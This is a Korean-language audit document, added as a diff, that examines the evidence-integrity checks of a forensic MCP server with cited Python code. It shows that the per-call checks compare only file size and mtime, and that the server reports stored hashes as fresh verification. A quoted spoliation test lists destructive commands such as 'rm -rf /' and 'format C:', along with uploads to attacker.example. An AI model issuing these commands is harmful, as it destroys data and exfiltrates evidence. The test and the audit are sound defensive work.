@@ -1,0 +1,401 @@
+---
+cell: E02
+details:
+- id: E02.01
+  exception: true
+- id: E02.07
+  exception: true
+- id: E02.09
+  exception: true
+- id: E02.08
+  exception: false
+---
+
+# E02 증거 무결성 검증
+
+### E02.01 등록 시 기준값 자동 계산
+
+**구현.** 서버는 처음 도구를 부를 때 증거 파일을 열고 모델의 요청 없이 파일 전체의 SHA-256을 계산한다 [1][2].
+해시 범위는 증거 파일 하나의 처음부터 끝까지이고 1MiB씩 읽는다 [2].
+계산한 값은 `EvidenceGuard.sha256`에 기준값으로 보관하고 같은 때 크기와 수정 시각(`st_mtime_ns`)도 함께 보관한다 [2].
+기준값은 호출 기록의 `evidence_opened`에 남고 `evidence_metadata`의 `sha256`과 Volatility 도구 응답의 `evidence_sha256`으로 모델에게 간다 [3][4][5].
+
+서버는 사용자나 수집 도구가 남긴 해시를 받지 않는다 [1].
+그래서 서버를 시작하기 전에 바뀐 증거는 바뀐 상태가 기준값이 된다.
+
+**예외.** `evidence_metadata`는 보관한 기준값을 다시 계산하지 않고 `sha256`으로 돌려주며 응답에 그 사실을 표시하지 않는다 [4].
+증거 파일이 바뀐 뒤에 불러도 처음 계산한 해시를 그대로 돌려준다 [6].
+Volatility 도구 응답의 `evidence_sha256`도 실행 때 계산한 값이 아니라 보관한 기준값이다 [5].
+`evidence_metadata`의 설명은 `sha256`을 수집 시점("acquisition")의 해시라고 적지만 실제로는 서버가 처음 증거를 열 때 계산한 해시다 [4][2].
+
+### E02.07 도구 호출 중 자동 검증
+
+**구현.** 이 방식은 Volatility 도구 9개에 적용된다 [5].
+서버는 Volatility를 실행하기 직전과 끝난 직후에 증거 파일의 크기와 수정 시각을 다시 읽어 처음 연 때의 값과 비교한다 [5][7].
+해시는 다시 계산하지 않는다 [7].
+그래서 크기와 수정 시각을 그대로 둔 채 내용만 바꾸면 이 비교를 통과한다 [7].
+기준값은 처음 연 때 보관한 크기와 `st_mtime_ns`다 [2].
+둘 중 하나라도 다르면 `IntegrityError`를 내고 호출을 끝낸다(E02.08) [7].
+`evidence_metadata`와 `verify_evidence_integrity`는 이 비교를 하지 않는다 [4][8].
+
+**예외.** Volatility 도구 응답은 다시 계산하지 않은 `evidence_sha256`을 늘 `true`인 `integrity_ok`와 함께 싣는다 [5].
+`integrity_ok`는 서버 코드에 적은 상수라 크기·수정 시각 비교만 통과했다는 뜻인데 응답에는 무엇을 비교했는지 표시하지 않는다 [5].
+합성 증거의 첫 바이트를 바꾸고 수정 시각을 되돌린 뒤 `vol_info`를 부르면 처음 계산한 해시와 `integrity_ok: true`를 담은 응답이 돌아온다 [6].
+모듈 주석은 Volatility를 실행할 때마다 증거 파일이 실행 전후에 바이트 단위로 같은지("byte-identical") 확인한다고 적는다 [9].
+그러나 실제로는 크기와 수정 시각만 비교한다 [7].
+
+### E02.09 도구를 요청해 검증
+
+**구현.** 모델이 `verify_evidence_integrity`를 부르면 서버는 증거 파일 전체의 SHA-256을 다시 계산해 기준값과 비교한다 [8].
+기준값은 E02.01에서 서버가 처음 연 때 계산한 해시다 [2][8].
+응답은 경로, `sha256_before`(기준값), `sha256_after`(다시 계산한 값), 두 값이 같은지 `unchanged`를 싣는다 [8].
+비교 결과는 호출 기록의 `evidence_integrity` 항목에도 같은 값으로 남는다 [10].
+크기와 수정 시각을 그대로 둔 내용 변경은 이 도구로 드러난다 [6].
+기준값을 다시 시작할 때마다 새로 계산하므로 서버 실행 사이에 바뀐 증거는 이 도구로 드러나지 않는다(P04.10).
+
+서버 프로세스에서 처음 부른 도구가 `verify_evidence_integrity`이면 기준값 계산과 재계산이 같은 호출 안에서 잇달아 실행되므로 `unchanged`는 `true`가 된다 [1][2][8][11].
+등록하지 않은 도구 이름으로 부르면 FastMCP가 도구 함수를 부르기 전에 `Unknown tool` 오류로 거부하므로 서버는 증거를 열지 않는다 [12].
+사용자 CLI `siftpp-spoliation-test`는 등록하지 않은 도구 이름 14개만 부른 뒤 이 도구를 부르므로 이 경우에 해당한다 [13].
+`siftpp-verify`와 `siftpp-gui`도 새 서버 프로세스를 실행해 같은 검사 함수 `assess_spoliation`을 부른다 [14].
+
+`siftpp-investigate`는 조사를 끝낼 때 이 도구를 부르고 결과를 보고서 요약과 기록 `run_end`에 싣는다 [15].
+
+**예외.** 해시 비교가 어긋나도 서버는 `unchanged: false`를 담은 정상 응답을 돌려주고 기록에 같은 값을 남길 뿐 이후 호출을 막지 않는다 [8][10].
+크기와 수정 시각이 그대로인 내용 변경이면 `unchanged: false`가 나온 뒤에도 Volatility 도구가 그대로 실행되고 `integrity_ok: true`를 돌려준다 [6].
+
+### E02.08 불일치 시 중단·경고
+
+**구현.** 이 방식은 E02.07의 크기·수정 시각 비교에 적용된다.
+비교가 어긋나면 서버는 `IntegrityError`를 내고 FastMCP가 이를 `isError` 응답으로 돌려준다 [7][16].
+오류 문구는 `Evidence changed during analysis: <경로>`다 [7][6].
+기준값은 바뀌지 않으므로 그 뒤의 모든 Volatility 도구 호출도 같은 오류로 실행 전에 끝난다 [2][7].
+실행이 끝난 뒤의 비교에서 어긋나면 이미 받은 Volatility 출력을 버리고 호출 기록 항목도 남기지 않는다 [7].
+이 오류는 응답으로만 알리고 호출 기록에는 남지 않는다 [7].
+`verify_evidence_integrity`의 해시 비교가 어긋난 경우는 값만 돌려주므로 이 상세에 넣지 않고 E02.09에서 본다 [8].
+
+### 근거
+
+[1] 증거 경로는 환경변수에서 받고 처음 호출 때 연다.
+
+```python
+def _build_runner() -> VolatilityRunner:
+    evidence = os.environ.get("SIFTPP_EVIDENCE")
+    if not evidence:
+        raise RuntimeError("Set SIFTPP_EVIDENCE to the path of the memory image")
+    audit = AuditLogger(os.environ.get("SIFTPP_AUDIT_LOG", "analysis/audit.jsonl"))
+    runner = VolatilityRunner(
+        guard=EvidenceGuard.open(evidence),
+        audit=audit,
+        agent=os.environ.get("SIFTPP_AGENT", "investigator"),
+        offline=os.environ.get("SIFTPP_VOL_OFFLINE") == "1",
+    )
+    runner.session_start()
+    return runner
+```
+
+[`src/protocol_siftpp/mcp_server/server.py:31-43`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/server.py#L31-L43)
+
+[2] 처음 열 때 파일 전체를 해시하고 크기와 수정 시각을 보관한다.
+
+```python
+    @classmethod
+    def open(cls, path: str | Path) -> "EvidenceGuard":
+        p = Path(path)
+        if not p.is_file():
+            raise FileNotFoundError(f"Evidence file not found: {p}")
+        g = cls(path=p)
+        st = p.stat()
+        g.size = st.st_size
+        g._mtime_ns = st.st_mtime_ns
+        g.sha256 = g.full_sha256()  # acquisition hash (chain of custody)
+        return g
+
+    def full_sha256(self) -> str:
+        h = hashlib.sha256()
+        with self.path.open("rb") as fh:
+            for chunk in iter(lambda: fh.read(1 << 20), b""):
+                h.update(chunk)
+        return h.hexdigest()
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:98-115`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L98-L115)
+
+[3] `evidence_opened`에 기준값을 남긴다.
+
+```python
+    def session_start(self) -> dict[str, Any]:
+        return self.audit.log("evidence_opened", path=str(self.guard.path),
+                              sha256=self.guard.sha256, bytes=self.guard.size,
+                              agent=self.agent)
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:142-145`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L142-L145)
+
+[4] `evidence_metadata`는 보관한 값을 돌려준다.
+
+```python
+@mcp.tool()
+def evidence_metadata() -> str:
+    """Evidence path, size, acquisition sha256 (chain of custody), and the list
+    of available read-only tools. Call this first."""
+    r = get_runner()
+    return _dump({
+        "path": str(r.guard.path),
+        "sha256": r.guard.sha256,
+        "bytes": r.guard.size,
+        "read_only": True,
+        "tools": [{"name": p.tool, "summary": p.summary} for p in READ_ONLY_PLUGINS],
+    })
+```
+
+[`src/protocol_siftpp/mcp_server/server.py:57-68`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/server.py#L57-L68)
+
+[5] Volatility 도구의 응답이다.
+`evidence_sha256`은 보관한 값이고 `integrity_ok`는 상수다.
+
+```python
+        return {
+            "tool": tool,
+            "plugin": spec.plugin,
+            "command": argv,
+            "exit_code": returncode,
+            "timed_out": timed_out,
+            "evidence_sha256": self.guard.sha256,
+            "integrity_ok": True,
+            "output_sha256": out_sha,
+            "output_bytes": len(stdout),
+            "duration_ms": duration_ms,
+            "row_count": row_count,
+            "truncated": truncated,
+            "result": result,
+            "result_text": result_text,
+            "stderr": stderr.decode("utf-8", errors="replace")[-2000:]
+            if returncode != 0 else "",
+        }
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:208-225`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L208-L225)
+
+[6] (실행 확인) 합성 증거로 서버를 실행했다.
+첫 바이트를 바꾸고 수정 시각을 되돌린 뒤 부른 `vol_info`는 `integrity_ok: true`와 처음 해시를 담은 응답을 돌려주었다.
+이어서 부른 `verify_evidence_integrity`는 `unchanged: false`를 돌려주었고 그 뒤 `vol_info`도 같은 응답을 돌려주었다.
+수정 시각을 바꾼 뒤 부른 `vol_info`는 `isError` 응답 `Error executing tool vol_info: Evidence changed during analysis: probe-out\synthetic.bin`을 돌려주었다.
+그 뒤 부른 `evidence_metadata`는 처음 계산한 해시를 그대로 돌려주었다.
+
+[7] Volatility 실행 전후의 비교와 그 비교가 쓰는 함수다.
+`IntegrityError`가 나면 189행의 기록 쓰기에 이르지 않는다.
+
+```python
+    def assert_unchanged(self) -> None:
+        """Cheap per-call guard: size + mtime must match acquisition."""
+        st = self.path.stat()
+        if st.st_size != self.size or st.st_mtime_ns != self._mtime_ns:
+            raise IntegrityError(f"Evidence changed during analysis: {self.path}")
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:117-121`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L117-L121)
+
+```python
+        self.guard.assert_unchanged()  # before
+        started = time.monotonic()
+        try:
+            proc = subprocess.run(
+                argv,
+                stdin=subprocess.DEVNULL,
+                capture_output=True,
+                timeout=self.timeout_s,
+            )
+            timed_out = False
+            stdout = proc.stdout or b""
+            stderr = proc.stderr or b""
+            returncode = proc.returncode
+        except subprocess.TimeoutExpired as exc:
+            timed_out = True
+            stdout = exc.stdout or b""
+            stderr = (exc.stderr or b"") + b"\n[timed out]"
+            returncode = -1
+        duration_ms = int((time.monotonic() - started) * 1000)
+        self.guard.assert_unchanged()  # after
+
+        out_sha = sha256_hex(stdout)
+        out_text = stdout.decode("utf-8", errors="replace")
+
+        self.audit.tool_call(agent=self.agent, tool=tool, command=argv,
+                             output_sha256=out_sha, output_bytes=len(stdout),
+                             duration_ms=duration_ms, exit_code=returncode,
+                             evidence_sha256=self.guard.sha256)
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:165-192`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L165-L192)
+
+[8] `verify_evidence_integrity`가 부르는 대조다.
+
+```python
+    def verify_integrity(self) -> dict[str, Any]:
+        """Re-hash the FULL evidence file and prove it equals acquisition.
+
+        This is the spoliation proof for the integrity report (deliverable #6)."""
+        before = self.guard.sha256
+        after = self.guard.full_sha256()
+        self.audit.evidence_integrity(path=self.guard.path,
+                                      sha256_before=before, sha256_after=after)
+        return {"path": str(self.guard.path), "sha256_before": before,
+                "sha256_after": after, "unchanged": before == after}
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:227-236`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L227-L236)
+
+[9] 모듈 주석이 적은 무결성 확인이다.
+
+```python
+altering evidence. Every run:
+
+* executes Volatility via a fixed argv list (no shell -> no injection),
+* checks the evidence file is byte-identical before and after (integrity),
+* hashes the full tool output so each finding can cite ``command + sha256``.
+```
+
+[`src/protocol_siftpp/mcp_server/volatility.py:7-11`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/volatility.py#L7-L11)
+
+[10] 대조 결과를 기록에 남기는 함수다.
+
+```python
+    def evidence_integrity(self, *, path: str | Path, sha256_before: str,
+                           sha256_after: str) -> dict[str, Any]:
+        return self.log("evidence_integrity", path=str(path),
+                        sha256_before=sha256_before, sha256_after=sha256_after,
+                        unchanged=(sha256_before == sha256_after))
+```
+
+[`src/protocol_siftpp/audit.py:114-118`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/audit.py#L114-L118)
+
+[11] 서버는 처음 부른 도구 안에서 증거를 열고 `verify_evidence_integrity`는 그 실행기로 대조한다.
+
+```python
+def get_runner() -> VolatilityRunner:
+    global _runner
+    if _runner is None:
+        _runner = _build_runner()
+    return _runner
+```
+
+[`src/protocol_siftpp/mcp_server/server.py:46-50`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/server.py#L46-L50)
+
+```python
+@mcp.tool()
+def verify_evidence_integrity() -> str:
+    """Re-hash the full evidence file and confirm it is byte-identical to
+    acquisition (spoliation proof). Call this at the end of an investigation."""
+    return _dump(get_runner().verify_integrity())
+```
+
+[`src/protocol_siftpp/mcp_server/server.py:125-129`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/mcp_server/server.py#L125-L129)
+
+[12] MCP Python SDK 1.27.2의 FastMCP는 등록하지 않은 이름이면 도구 함수를 부르기 전에 `ToolError`를 낸다: [`src/mcp/server/fastmcp/tools/tool_manager.py:89-91`](https://github.com/modelcontextprotocol/python-sdk/blob/62137874ff26dd74d2fea80ff528a7fd9ca7a5e7/src/mcp/server/fastmcp/tools/tool_manager.py#L89-L91).
+
+[13] `siftpp-spoliation-test`가 부르는 이름 목록과 그 뒤의 대조 호출이다.
+
+```python
+# Exactly what an attacker (or prompt injection) would attempt. None of these are
+# registered in the read-only MCP server, so each must be refused.
+DESTRUCTIVE_ATTEMPTS: list[tuple[str, dict[str, Any]]] = [
+    ("windows.dumpfiles", {}),
+    ("vol_dumpfiles", {}),
+    ("windows.memmap", {"dump": True}),
+    ("vol_procdump", {"pid": 4}),
+    ("windows.procdump", {"pid": 4}),
+    ("vol_memdump", {"pid": 4}),
+    ("bash", {"command": "del /f evidence.img"}),
+    ("shell", {"cmd": "rm -f evidence"}),
+    ("exec", {"argv": ["rm", "-rf", "/"]}),
+    ("run_command", {"command": "format C:"}),
+    ("write_file", {"path": "evidence.img", "data": "x"}),
+    ("delete_file", {"path": "evidence.img"}),
+    ("upload", {"url": "https://attacker.example/exfil"}),
+    ("export_evidence", {"dest": "https://attacker.example"}),
+]
+```
+
+[`src/protocol_siftpp/spoliation_test.py:28-45`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/spoliation_test.py#L28-L45)
+
+```python
+async def assess_spoliation(mcp: Any, *, attempts=DESTRUCTIVE_ATTEMPTS) -> dict[str, Any]:
+    """Probe an (already-connected) MCP bridge; return a structured pass/fail report."""
+    surface = [{"tool": t["name"], "destructive": _looks_destructive(t["name"])}
+               for t in mcp.anthropic_tools]
+
+    results = []
+    for name, args in attempts:
+        try:
+            res = await mcp.call(name, args)
+            refused = _refused(res)
+            detail = (res.get("result_text") or json.dumps(res.get("result")) or "")[:160]
+        except Exception as exc:  # unknown tool -> server raises -> refused
+            refused = True
+            detail = f"{type(exc).__name__}: {str(exc)[:140]}"
+        results.append({"attempt": name, "args": args, "refused": refused, "detail": detail})
+
+    try:
+        integrity = await mcp.call("verify_evidence_integrity", {})
+    except Exception as exc:
+        integrity = {"unchanged": None, "error": str(exc)}
+```
+
+[`src/protocol_siftpp/spoliation_test.py:64-83`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/spoliation_test.py#L64-L83)
+
+[14] `siftpp-verify`와 `siftpp-gui`가 새 서버로 같은 검사를 부르는 곳이다.
+
+```python
+async def _spoliation_passed() -> tuple[bool, str]:
+    with tempfile.TemporaryDirectory() as td:
+        out = Path(td)
+        evidence = out / "synthetic-evidence.bin"
+        evidence.write_bytes(b"SYNTHETIC EVIDENCE\n" * 64)
+        async with McpForensics(_server_params(evidence, out / "mcp.jsonl")) as mcp:
+            r = await assess_spoliation(mcp)
+```
+
+[`src/protocol_siftpp/verify_all.py:40-46`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/verify_all.py#L40-L46)
+
+```python
+async def api_spoliation(request: Any) -> JSONResponse:
+    with tempfile.TemporaryDirectory() as td:
+        out = Path(td)
+        evidence = out / "synthetic-evidence.bin"
+        evidence.write_bytes(b"SYNTHETIC EVIDENCE\n" * 64)
+        params = _server_params(evidence, out / "mcp.jsonl")
+        async with McpForensics(params) as mcp:
+            report = await assess_spoliation(mcp)
+```
+
+[`src/protocol_siftpp/gui.py:143-150`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/gui.py#L143-L150)
+
+[15] 클라이언트가 조사 끝에 부르고 요약에 싣는다.
+
+```python
+        integrity = await self.mcp.call("verify_evidence_integrity", {})
+        confirmed = [f for f in self.findings if f.status == FindingStatus.confirmed]
+        self.audit.log(
+            "run_end",
+            findings=len(self.findings),
+            confirmed=len(confirmed),
+            evidence_unchanged=integrity.get("unchanged"),
+        )
+
+        return CaseReport(
+            case_id=case_id or datetime.now(timezone.utc).strftime("case-%Y%m%d-%H%M%S"),
+            evidence_path=evidence_path,
+            evidence_sha256=evidence_sha,
+            findings=self.findings,
+            iterations_run=corrections_run,
+            summary=(
+                f"{len(confirmed)} confirmed of {len(self.findings)} findings; "
+                f"{corrections_run} self-correction iteration(s); "
+                f"evidence integrity {'verified' if integrity.get('unchanged') else 'FAILED'}."
+            ),
+        )
+```
+
+[`src/protocol_siftpp/orchestrator.py:302-322`](https://github.com/tupils1/protocol-siftpp/blob/ae5e7d599df9aa3cbb726a9fd7dfed9fb4d98615/src/protocol_siftpp/orchestrator.py#L302-L322)
+
+[16] MCP Python SDK 1.27.2의 FastMCP는 도구 함수의 예외를 `ToolError`로 바꾸고([`src/mcp/server/fastmcp/tools/base.py:116-117`](https://github.com/modelcontextprotocol/python-sdk/blob/62137874ff26dd74d2fea80ff528a7fd9ca7a5e7/src/mcp/server/fastmcp/tools/base.py#L116-L117)) 하위 서버의 처리기는 처리 중 난 예외를 `isError`가 참인 결과로 돌려준다([`src/mcp/server/lowlevel/server.py:583-584`](https://github.com/modelcontextprotocol/python-sdk/blob/62137874ff26dd74d2fea80ff528a7fd9ca7a5e7/src/mcp/server/lowlevel/server.py#L583-L584), [`src/mcp/server/lowlevel/server.py:467-474`](https://github.com/modelcontextprotocol/python-sdk/blob/62137874ff26dd74d2fea80ff528a7fd9ca7a5e7/src/mcp/server/lowlevel/server.py#L467-L474)).
